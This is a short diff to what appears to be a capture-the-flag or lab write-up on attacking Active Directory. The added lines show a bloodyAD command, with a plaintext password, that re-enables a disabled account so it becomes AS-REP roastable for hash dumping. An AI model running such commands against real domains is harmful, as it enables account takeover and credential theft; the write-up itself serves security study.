@@ -499,5 +499,13 @@ First ill make the account AS-REP roastable
 But now checking bloodhound the account looks disabled, this is why i couldnt dump the hash
 
 ```python
+bloodyAD --host dc01.fragments.local -d fragments.local -u j.woods -p 'hpFqULtQoY!' remove uac 'o.rodrigo' -f ACCOUNTDISABLE
+
+[+] ['ACCOUNTDISABLE'] property flags removed from o.rodrigo's userAccountControl
+```
+
+Now the account is enabled and AS-REP roastable i can dump the hash
+
+```python
 
 ```
